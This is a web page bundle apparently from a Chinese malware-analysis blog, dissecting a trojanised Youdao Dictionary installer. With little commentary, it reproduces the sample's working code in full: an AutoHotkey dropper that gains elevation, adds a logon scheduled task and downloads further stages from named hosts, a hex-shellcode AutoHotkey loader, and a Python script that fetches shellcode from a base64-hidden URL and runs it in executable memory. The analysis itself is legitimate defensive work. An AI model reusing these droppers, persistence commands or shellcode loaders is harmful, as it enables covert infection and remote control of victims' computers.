import{_ as l,K as o,L as u,a5 as e,M as n,N as s,W as c,F as a}from"./framework-edebdfe1.js";const d="/imgs/rev/virus/vyoudao/1.png",p="/imgs/rev/virus/vyoudao/2.png",r="/imgs/rev/virus/vyoudao/3.png",v={},m=n("h1",{id:"有道字典",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#有道字典","aria-hidden":"true"},"#"),s(" 有道字典")],-1),C=n("h2",{id:"收集样本",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#收集样本","aria-hidden":"true"},"#"),s(" 收集样本")],-1),F=n("code",null,"youdaoFY.zip",-1),b={href:"https://deelmind.org/app/1157.html",target:"_blank",rel:"noopener noreferrer"},q=c(`<div class="language-url line-numbers-mode" data-ext="url"><pre class="language-url"><code><span class="token scheme">https<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host">www.google.com</span></span><span class="token path"><span class="token path-separator">/</span>search</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">q</span>=<span class="token value">%E6%9C%89%E9%81%93%E5%AD%97%E5%85%B8</span></span><span class="token pair-delimiter">&amp;</span><span class="token pair"><span class="token key">newwindow</span>=<span class="token value">1</span></span><span class="token pair-delimiter">&amp;</span><span class="token pair"><span class="token key">sca_esv</span>=<span class="token value">0ba29d23b081b3ca</span></span><span class="token pair-delimiter">&amp;</span><span class="token pair"><span class="token key">sxsrf</span>=<span class="token value">ADLYWIL6zek9eGep9uTAH9WstdLJ4jt6mg%3A1717587588916</span></span><span class="token pair-delimiter">&amp;</span><span class="token pair"><span class="token key">source</span>=<span class="token value">hp</span></span><span class="token pair-delimiter">&amp;</span><span class="token pair"><span class="token key">ei</span>=<span class="token value">hE5gZuTkJpfe4-EPhKCJ2QM</span></span><span class="token pair-delimiter">&amp;</span><span class="token pair"><span class="token key">iflsig</span>=<span class="token value">AL9hbdgAAAAAZmBclI18C9W_bFiwm22QJFOW9QeIbas-</span></span><span class="token pair-delimiter">&amp;</span><span class="token pair"><span class="token key">ved</span>=<span class="token value">0ahUKEwjktt2wsMSGAxUX7zgGHQRQIjsQ4dUDCBc</span></span><span class="token pair-delimiter">&amp;</span><span class="token pair"><span class="token key">uact</span>=<span class="token value">5</span></span><span class="token pair-delimiter">&amp;</span><span class="token pair"><span class="token key">oq</span>=<span class="token value">%E6%9C%89%E9%81%93%E5%AD%97%E5%85%B8</span></span><span class="token pair-delimiter">&amp;</span><span class="token pair"><span class="token key">gs_lp</span>=<span class="token value">Egdnd3Mtd2l6IgzmnInpgZPlrZflhbgyDRAAGIAEGLEDGIMBGAoyDRAAGIAEGLEDGIMBGAoyBxAAGIAEGAoyBxAAGIAEGAoyBxAAGIAEGAoyBxAAGIAEGAoyBxAAGIAEGAoyBxAAGIAEGAoyBxAAGIAEGAoyBxAAGIAEGApIi2JQAFjfTXAEeACQAQCYAZICoAH5GqoBBjAuMjIuMbgBA8gBAPgBAZgCF6AC9xfCAgQQIxgnwgIREC4YgAQYsQMY0QMYgwEYxwHCAgsQABiABBixAxiDAcICDhAuGIAEGLEDGIMBGIoFwgIIEAAYgAQYsQPCAgsQLhiABBixAxiDAcICChAjGIAEGCcYigXCAgUQABiABMICCxAuGIAEGMcBGK8BwgIJEAAYgAQYChgMwgIIEAAYgAQYogTCAgYQABgEGB7CAgYQABgeGA_CAgYQABgIGB7CAgQQABgewgIKEC4YChgqGAwYHsICCBAAGAoYDBgewgIGEAAYDRgewgIIEAAYDRgeGA_CAggQABgEGA0YHsICCBAAGAQYHhgPwgIIEAAYBBgIGB7CAggQABgIGA0YHsICDBAAGAQYCBgNGB4YD8ICChAAGAQYDRgeGA_CAgoQABgEGAgYHhgPwgIKEAAYBBgHGB4YD8ICBhAAGAcYHsICCBAAGAcYHhgPmAMAkgcGMy4xOC4yoAeOZA</span></span><span class="token pair-delimiter">&amp;</span><span class="token pair"><span class="token key">sclient</span>=<span class="token value">gws-wiz</span></span></span><span class="token fragment"><span class="token fragment-delimiter">#</span>ip=1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+d+'" alt="er" loading="lazy"></p><p><img src="'+p+'" alt="er" loading="lazy"></p><h2 id="简单分析" tabindex="-1"><a class="header-anchor" href="#简单分析" aria-hidden="true">#</a> 简单分析</h2><ol><li>运行病毒文件</li></ol><p><img src="'+r+`" alt="er" loading="lazy"></p><div class="language-AutoHotKey line-numbers-mode" data-ext="AutoHotKey"><pre class="language-AutoHotKey"><code>#NoTrayIcon 
#NoEnv 
#NoTrayIcon
#SingleInstance off
   try
   {
Run, *RunAs %comspec% /c start C:\\ProgramData\\AutoHotkey\\YoudaoDictSetup.exe&amp;schtasks /create /sc onlogon /tn AHK /rl highest /tr &quot;C:\\Users\\Public\\Music\\Update\\AutoHotkey\\AutoHotkey.exe&quot; /F&amp;del C:\\Users\\Public\\Music\\Update\\AutoHotkey\\AutoHotkey.ahk&amp;del C:\\Users\\Public\\AutoHotkey\\Run8.txt , , Hide
url := &quot;https://sogou88.oss-cn-beijing.aliyuncs.com/py.zip&quot;
localFile := &quot;C:\\Users\\Public\\Music\\python\\py.zip&quot;
UrlDownloadToFile, %url%, %localFile%
url := &quot;http://laicai168.com/qd.jpg&quot;
localFile := &quot;C:\\Users\\Public\\Music\\python\\qd.jpg&quot;
UrlDownloadToFile, %url%, %localFile%
url := &quot;http://laicai168.com/qd.ahk&quot;
localFile := &quot;C:\\Users\\Public\\Music\\Update\\AutoHotkey\\AutoHotkey.ahk&quot;
UrlDownloadToFile, %url%, %localFile%
RunWait, %comspec% /c powershell.exe -Command Expand-Archive -Path C:\\Users\\Public\\Music\\python\\Py.zip -DestinationPath C:\\Users\\Public\\Music\\python , , Hide
randomString := &quot;&quot;
Lenght := rand(1,10) 
Loop, %Lenght%
{
    Random, char, 48, 122 
    If (char &gt; 57 &amp;&amp; char &lt; 65) || (char &gt; 90 &amp;&amp; char &lt; 97) 
        Continue
    randomString .= Chr(char) 
}
FileAppend, %randomString%, C:\\Users\\Public\\Music\\python\\qd.jpg

rand(min, max) {
    Random, rand, min, max
    return rand
}
RunWait, %comspec% /c start C:\\Users\\Public\\Music\\python\\pythonw.exe C:\\Users\\Public\\Music\\python\\qd.jpg&amp;del C:\\Users\\Public\\Music\\python\\py.zip , , Hide
   }
; tUKF5GQ19
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>http://laicai168.com/qd.ahk</li></ol><div class="language-ahk line-numbers-mode" data-ext="ahk"><pre class="language-ahk"><code>
;You can compile and set icons by using Ahk2Exe.exe

;If AutoHotkey.exe wants to change its name to abc.exe, Please modify Ahk=%A_ScriptDir%\\abc.exe

 #NoEnv
 #NoTrayIcon
 #SingleInstance off
 SetBatchLines, -1
 if A_IsCompiled
 {
   Ahk=%A_ScriptDir%\\AutoHotkey.exe
   FileInstall, AutoHotkey.exe, %Ahk%
 }
 else Ahk=

s=
s.=&quot;u3615544364u640425871u1678942631u2998343137u1434168171u24144&quot;
...
s.=&quot;313546u1039906973u484215839u3522253212&quot;

 Exec(s, Ahk)
 ExitApp

Exec(str, Ahk=&quot;&quot;, arg=&quot;&quot;) {
  static MyFunc, base, ScriptName:=%True%
  s:=RegExReplace(str,&quot;\\s&quot;), StrReplace(s,&quot;u&quot;,&quot;&quot;,size)
  VarSetCapacity(str,(size+1)*4,0), s:=SubStr(s,InStr(s,&quot;u&quot;)+1)
  Loop, Parse, s, u
    NumPut(A_LoopField, str, (A_Index-1)*4, &quot;uint&quot;)
  ;-----------------------------
  Ahk:=Ahk ? Ahk : A_IsCompiled
    ? A_ScriptDir &quot;\\AutoHotkey.exe&quot; : A_AhkPath
  IfNotExist, %Ahk%
  {
    MsgBox, 4096, Error!, \`n\`nCan&#39;t Find: %Ahk% !\`n\`n
    return, 0
  }
  if !MyFunc
  {
    x32:=&quot;5557565381EC4C0100008B9C24680100008BBC246C01000&quot;
    . &quot;08BAC24700100008B433C01D88038500F85380500008078014&quot;
    . &quot;50F852E0500008B706085F60F84FF04000031C9837864010F9&quot;
    . &quot;2C119D283E210894C245083C2788B341001DE8B4E188974243&quot;
    . &quot;C8B562085C90F84E504000031C08D3413EB0B83C00139C10F8&quot;
    . &quot;4D30400008B1486813C134765745075E9817C1304726F63417&quot;
    . &quot;5DF8B74243C8D04430346240FB7008D048303461C8B3085F60&quot;
    . &quot;F84A0040000B86500000001DE891C2466894424688D442460C&quot;
    . &quot;744246057726974C74424646546696C89442404FFD683EC088&quot;
    . &quot;944243C8D442475891C24C7442475476C6F62C7442479616C4&quot;
    . &quot;16CC744247D6C6F630089442404FFD683EC08BA65650000894&quot;
    . &quot;424548D44246A6689542472891C24C744246A476C6F62C7442&quot;
    . &quot;46E616C4672C64424740089442404FFD683EC08B9734100008&quot;
    . &quot;94424488D84248D00000066898C2499000000891C24C784248&quot;
    . &quot;D00000043726561C784249100000074655072C784249500000&quot;
    . &quot;06F636573C684249B0000000089442404FFD683EC088944245&quot;
    . &quot;C8D8424BE000000891C24C78424BE00000043726561C78424C&quot;
    . &quot;200000074654E61C78424C60000006D656450C78424CA00000&quot;
    . &quot;069706541C68424CE0000000089442404FFD683EC088944245&quot;
    . &quot;88D8424CF000000891C24C78424CF000000436F6E6EC78424D&quot;
    . &quot;30000006563744EC78424D7000000616D6564C78424DB00000&quot;
    . &quot;050697065C68424DF0000000089442404FFD683EC088944244&quot;
    . &quot;08D842481000000891C24C7842481000000436C6F73C784248&quot;
    . &quot;50000006548616EC7842489000000646C650089442404FFD68&quot;
    . &quot;3EC088D5C24608944244CC744241000000000C744240800000&quot;
    . &quot;000897C2404895C240CC7042400000000FF54243C83EC14807&quot;
    . &quot;C2460000F85E50200008D34AD04000000C7042400000000897&quot;
    . &quot;4244489742404FF54245483EC0885C089C30F841703000031C&quot;
    . &quot;085ED7415908B148789148383C00139C575F38B44244483E80&quot;
    . &quot;4C7040300000000C784249C0000000B000000BA0B000000C78&quot;
    . &quot;424A00000000D000000C78424A40000001100000031C0C7842&quot;
    . &quot;4A800000013000000EB0C89C283E2038B94949C00000069D28&quot;
    . &quot;300000089C183E10301C283C00183F86489948C9C00000075D&quot;
    . &quot;831D285ED742D669089D183E10369848C9C000000830000000&quot;
    . &quot;1D089848C9C000000330493D1C083C00189049383C20139D57&quot;
    . &quot;5D58B8424640100008B742458C744241C00000000C74424180&quot;
    . &quot;0000000C744241400000000C744241000000000C744240CFF0&quot;
    . &quot;00000C744240800000000C744240402000000890424FFD683E&quot;
    . &quot;C2089C78B842464010000C744241C00000000C744241800000&quot;
    . &quot;000C744241400000000C744241000000000C744240CFF00000&quot;
    . &quot;0C744240800000000C744240402000000890424FFD683EC208&quot;
    . &quot;3FFFF89C60F849D01000083F8FF0F84940100008D8C24E0000&quot;
    . &quot;0008D94244001000089C8C7000000000083C00439C275F3837&quot;
    . &quot;C245001894C2420C744241C00000000C744241800000000C74&quot;
    . &quot;4241400000000C744241000000000C744240C00000000C7442&quot;
    . &quot;4080000000019C0C704240000000083E0E483C060898424E00&quot;
    . &quot;000008D8424AC000000894424248B84246001000089442404F&quot;
    . &quot;F54245C83EC2885C00F84DA0000008B6C244C8B8424AC00000&quot;
    . &quot;089042489E8FFD083EC048B8424B000000089042489E8FFD08&quot;
    . &quot;3EC04893C24C744240400000000FF54244083EC0889E8893C2&quot;
    . &quot;4FFD083EC04893424C744240400000000FF54244083EC088D4&quot;
    . &quot;42460895C2404893424C7442410000000008944240C8B44244&quot;
    . &quot;489442408FF54243C83EC1489E8893424FFD083EC04891C24F&quot;
    . &quot;F54244883EC0431C081C44C0100005B5E5F5DC21400C744245&quot;
    . &quot;001000000BA88000000E904FBFFFFB8FEFFFFFF81C44C01000&quot;
    . &quot;05B5E5F5DC2140081C44C010000B8FFFFFFFF5B5E5F5DC2140&quot;
    . &quot;0B8FDFFFFFFEBDA893C248B7C244C89F8FFD083EC0489F8893&quot;
    . &quot;424FFD083EC04891C24FF542448B8FAFFFFFF83EC04EBB1893&quot;
    . &quot;C248B7C244C89F8FFD083EC0489F8893424FFD083EC04891C2&quot;
    . &quot;4FF542448B8FBFFFFFF83EC04EB88B8FCFFFFFFEB8190&quot;
    x64:=&quot;4157415641554154555756534881EC98010000B8FFFFFFF&quot;
    . &quot;F8BB4240002000048899424E8010000418B503C4D89C748898&quot;
    . &quot;C24E00100004D89CC4C01C2803A500F858C040000807A01450&quot;
    . &quot;F8582040000448B42604585C00F8489040000837A64014819C&quot;
    . &quot;031FF83E0104883C078837A6401400F92C7897C245C448B0C0&quot;
    . &quot;2B8FEFFFFFF4D01F9418B4918418B512085C90F843D0400003&quot;
    . &quot;1C04D8D0417EB100F1F40004883C00139C10F864B040000418&quot;
    . &quot;B148041813C174765745075E641817C1704726F634175DB418&quot;
    . &quot;B5124498D04470FB71410418B411C498D14978B3C0285FF0F8&quot;
    . &quot;41304000048B8577269746546696C488D6C24704C01FF48894&quot;
    . &quot;42470B8650000004C89F94889EA6689442478FFD74989C548B&quot;
    . &quot;8476C6F62616C416C488D9424900000004C89F948898424900&quot;
    . &quot;00000C78424980000006C6F6300FFD7BA656500004889C348B&quot;
    . &quot;8476C6F62616C467266899424880000004C89F9488D9424800&quot;
    . &quot;000004889842480000000C684248A00000000FFD7B97341000&quot;
    . &quot;0488944245048B8437265617465507266898C24BC000000488&quot;
    . &quot;D9424B00000004C89F948898424B0000000C78424B80000006&quot;
    . &quot;F636573C68424BE00000000FFD7488944246048B8437265617&quot;
    . &quot;4654E61488D9424D000000048898424D000000048B86D65645&quot;
    . &quot;0697065414C89F948898424D8000000C68424E000000000FFD&quot;
    . &quot;74989C648B8436F6E6E6563744E488D9424F00000004889842&quot;
    . &quot;4F000000048B8616D6564506970654C89F948898424F800000&quot;
    . &quot;0C684240001000000FFD7488944246848B8436C6F736548616&quot;
    . &quot;E488D9424A00000004C89F948898424A0000000C78424A8000&quot;
    . &quot;000646C6500FFD74531C031C94889C748C7442420000000004&quot;
    . &quot;989E94C89E241FFD5807C247000B8FDFFFFFF0F85490200008&quot;
    . &quot;D14B50400000031C94989D7FFD34885C04889C30F849202000&quot;
    . &quot;031C085F6741D0F1F840000000000418B14848914834883C00&quot;
    . &quot;139C677F189F048C1E002C7040300000000C78424C00000000&quot;
    . &quot;B000000BA0B000000C78424C40000000D000000C78424C8000&quot;
    . &quot;0001100000031C0C78424CC00000013000000EB0C89C283E20&quot;
    . &quot;38B9494C000000069D28300000089C183E10301C283C00183F&quot;
    . &quot;86489948CC000000075D831D285F6742E904889D183E103698&quot;
    . &quot;48CC00000008300000001D089848CC0000000330493D1C083C&quot;
    . &quot;0018904934883C20139D677D34531C041B9FF000000BA02000&quot;
    . &quot;000488B8C24E801000048C744243800000000C744243000000&quot;
    . &quot;000C744242800000000C74424200000000041FFD64889C6453&quot;
    . &quot;1C048C744243800000000C744243000000000C744242800000&quot;
    . &quot;00041B9FF000000C744242000000000BA02000000488B8C24E&quot;
    . &quot;801000041FFD64883FEFF4989C40F84380100004883F8FF0F8&quot;
    . &quot;42E010000488D8C2430010000488D9424900100004889C8669&quot;
    . &quot;0C700000000004883C0044839C275F1837C245C0148894C244&quot;
    . &quot;048C74424380000000048C744243000000000C744242800000&quot;
    . &quot;000C744242000000000488B9424E001000019C04531C94531C&quot;
    . &quot;083E0E431C983C06089842430010000488D842410010000488&quot;
    . &quot;9442448488B442460FFD085C00F8488000000488B8C2410010&quot;
    . &quot;000FFD7488B8C2418010000FFD74C8B74246831D24889F14C8&quot;
    . &quot;9F0FFD04889F1FFD731D24C89E14C89F0FFD04989E94589F84&quot;
    . &quot;889DA4C89E148C74424200000000041FFD54C89E1FFD74889D&quot;
    . &quot;9488B442450FFD031C04881C4980100005B5E5F5D415C415D4&quot;
    . &quot;15E415FC3B888000000C744245C01000000E981FBFFFFB8FEF&quot;
    . &quot;FFFFFEBD34889F1FFD74C89E1FFD74889D9488B442450FFD0B&quot;
    . &quot;8FAFFFFFFEBB84889F1FFD74C89E1FFD74889D9488B442450F&quot;
    . &quot;FD0B8FBFFFFFFEB9DB8FCFFFFFFEB969090909090&quot;
    hex:=A_PtrSize=8 ? x64:x32
    VarSetCapacity(MyFunc, len:=StrLen(hex)//2)
    Loop, % len
      NumPut(&quot;0x&quot; SubStr(hex,2*A_Index-1,2),MyFunc,A_Index-1,&quot;uchar&quot;)
    DllCall(&quot;VirtualProtect&quot;,&quot;ptr&quot;,&amp;MyFunc,&quot;ptr&quot;,len,&quot;uint&quot;,0x40,&quot;ptr*&quot;,0)
    base:=DllCall(&quot;GetModuleHandle&quot;, &quot;Str&quot;,&quot;Kernel32&quot;, &quot;ptr&quot;)
    ScriptName:=ScriptName ? ScriptName : A_ScriptFullPath
  }
  Random, n, 1, 1000000
  pipe_name:=&quot;\\\\.\\pipe\\AHK&quot; . A_TickCount . n
  cmdline=&quot;%Ahk%&quot; &quot;%pipe_name%&quot; &quot;%ScriptName%&quot; %arg%
  DllCall(&amp;MyFunc, &quot;AStr&quot;,cmdline, &quot;AStr&quot;,pipe_name
  , &quot;ptr&quot;,base, &quot;ptr&quot;,&amp;str, &quot;uint&quot;,size)
  return, 1
}
;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="3"><li>http://laicai168.com/qd.jpg</li></ol><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> subprocess
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> ctypes
<span class="token keyword">import</span> ctypes<span class="token punctuation">.</span>wintypes
<span class="token keyword">import</span> time
<span class="token keyword">import</span> base64

<span class="token comment"># Execute the command without showing a window</span>

<span class="token comment"># Rest of your code...</span>

<span class="token comment"># Rest of your code...</span>

<span class="token comment"># Define the shellcode execution function signature</span>
ShellcodeFunction <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>CFUNCTYPE<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">download_binary_file</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> delay<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> response<span class="token punctuation">.</span>content
    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>RequestException<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Failed to load </span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">, retrying in </span><span class="token interpolation"><span class="token punctuation">{</span>delay<span class="token punctuation">}</span></span><span class="token string"> seconds...&#39;</span></span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>delay<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">None</span>

<span class="token keyword">def</span> <span class="token function">execute_shellcode</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> shellcode <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;No shellcode to execute.&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>

    shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
    <span class="token comment"># Allocate executable memory</span>
    exec_memory <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">(</span>
        <span class="token boolean">None</span><span class="token punctuation">,</span> shellcode_size<span class="token punctuation">,</span> <span class="token number">0x3000</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">)</span>  <span class="token comment"># PAGE_READWRITE : 0x04</span>
    <span class="token comment"># Change the allocated memory page protection to PAGE_EXECUTE_READWRITE</span>
    old_protect <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>wintypes<span class="token punctuation">.</span>DWORD<span class="token punctuation">(</span><span class="token punctuation">)</span>
    ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualProtect<span class="token punctuation">(</span>
        exec_memory<span class="token punctuation">,</span> shellcode_size<span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>byref<span class="token punctuation">(</span>old_protect<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># PAGE_EXECUTE_READWRITE : 0x40</span>
    <span class="token comment"># Copy the shellcode to the executable memory</span>
    ctypes<span class="token punctuation">.</span>memmove<span class="token punctuation">(</span>exec_memory<span class="token punctuation">,</span> shellcode<span class="token punctuation">,</span> shellcode_size<span class="token punctuation">)</span>
    <span class="token comment"># Create a function pointer to the shellcode</span>
    shellcode_func <span class="token operator">=</span> ShellcodeFunction<span class="token punctuation">(</span>exec_memory<span class="token punctuation">)</span>
    <span class="token comment"># Call the function</span>
    shellcode_func<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># Free the allocated memory</span>
    ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualFree<span class="token punctuation">(</span>exec_memory<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    encoded_url <span class="token operator">=</span> <span class="token string">&quot;aHR0cDovL2NvbWMwbS5jb20vbGFpY2FpMTY4LmNvbS5iaW4=&quot;</span>
    url <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>encoded_url<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        shellcode <span class="token operator">=</span> download_binary_file<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        execute_shellcode<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># </span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,11);function k(A,E){const i=a("DocsAD"),t=a("ExternalLinkIcon");return o(),u("div",null,[m,e(i),C,n("ol",null,[n("li",null,[s("下载样本"),F,s("，"),n("a",b,[s("下载地址"),e(t)])])]),q])}const D=l(v,[["render",k],["__file","vyoudao.html.vue"]]);export{D as default};